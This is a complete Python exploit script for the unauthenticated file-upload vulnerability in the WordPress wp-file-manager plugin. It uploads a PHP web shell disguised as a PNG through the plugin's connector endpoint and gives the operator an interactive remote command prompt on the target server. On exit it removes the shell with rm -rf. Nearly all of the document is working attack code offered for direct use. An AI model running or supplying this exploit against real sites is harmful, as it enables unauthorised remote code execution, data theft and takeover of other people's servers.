#!/usr/bin/env python3

import cmd
import requests
from colorama import Fore
import argparse
import re

proxies = {}
parser = argparse.ArgumentParser()
parser.add_argument('--url', required=True,action="store",metavar="http://192.168.56.104", help= "             URL of the website")
parser.add_argument('--proxies', action="store",metavar="http://127.0.0.1:8080",          help="              [protocol://]host[:port]      Use this proxy")
args = parser.parse_args()
arg_proxy = args.proxies

if arg_proxy != None:
    proxies[arg_proxy.split(':')[0]] = arg_proxy
url = args.url
shell_name = 'if_it_works.php'

# Uploading shell
def upload_shell(url):
    headers={
        'Content-Type'      : 'multipart/form-data; boundary=------------------------66e3ca93281c7050',
    }

    upload_data = '''
--------------------------66e3ca93281c7050
Content-Disposition: form-data; name="cmd"

upload
--------------------------66e3ca93281c7050
Content-Disposition: form-data; name="target"

l1_Lw
--------------------------66e3ca93281c7050
Content-Disposition: form-data; name="upload[]"; filename="if_it_works.php"
Content-Type: image/png

<?php system($_REQUEST["cmd"]); ?>
--------------------------66e3ca93281c7050
'''

    url = url + '/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php'
    r = requests.post(url=url, data=upload_data,headers=headers,proxies=proxies)
    if 'added' in r.text:
        return True
    else:
        return False

# Executing command
def execute(command):
    path = url +  '/wp-content/plugins/wp-file-manager/lib/files/if_it_works.php' + '?cmd=' + command 
    r = requests.get(url=path,proxies=proxies)
    output = Fore.CYAN + r.text
    print(output)

# Removing uploaded shell
def rm_shell():
    command = 'rm -rf ' + shell_name
    path = url +  '/wp-content/plugins/wp-file-manager/lib/files/if_it_works.php' + '?cmd=' + command 
    r = requests.get(url=path,proxies=proxies)
    return r.status_code

class Shell(cmd.Cmd):
    banner = '''
                    _
  ___ _ __ ___   __| |
 / __| '_ ` _ \ / _` |
| (__| | | | | | (_| |
 \___|_| |_| |_|\__,_|
'''
    print(banner)
    prompt = Fore.BLUE + '(ircashem)' + Fore.RESET
    def  default(self, line):
        execute(line)
    
    def do_exit(self,line):
        print(Fore.RED + "[-] Exiting...\n" + Fore.YELLOW + "Removing the uploaded shell" + Fore.RESET)
        if rm_shell() == 200:
                print(Fore.GREEN + "[+] Shell deleted from the server successfully." + Fore.RESET)
        else:
            print(Fore.RED + "[-] Error occured.")
        exit(1)


def main():
    # Checking the version of file manager plugin
    r = requests.get(url=url + '/wp-content/plugins/wp-file-manager/readme.txt' , proxies=proxies)
    version = float(re.findall('Stable tag\: (.*?)\nLicense\:', r.text)[0])
    
    # Uploading shell
    if upload_shell(url) and version < 6.9 and version > 6.0:
        print(Fore.GREEN + "[+] Shell uploaded successfully\n" + Fore.RED + "PwNed!!!" + Fore.RESET)
        try:
            Shell().cmdloop()
        except KeyboardInterrupt:
            print(Fore.RED + "[-] CTRL + C detected.\n" + Fore.YELLOW + "Removing the uploaded shell" + Fore.RESET)
            if rm_shell() == 200:
                print(Fore.GREEN + "[+] Shell deleted from the server successfully." + Fore.RESET)
            else:
                print(Fore.RED + "[-] Error occured.")
            exit(1)
    else:
        print(Fore.RED + "[-] Detected wp-file-manager plugin version: " + str(version) + Fore.YELLOW + "\nServer may not be vulnerable." + "\nPlease refer to the link for better understanding!!!" + Fore.RESET)
        print('https://www.wordfence.com/blog/2020/09/700000-wordpress-users-affected-by-zero-day-vulnerability-in-file-manager-plugin/')
        exit(1)


if __name__ == '__main__':
    main()
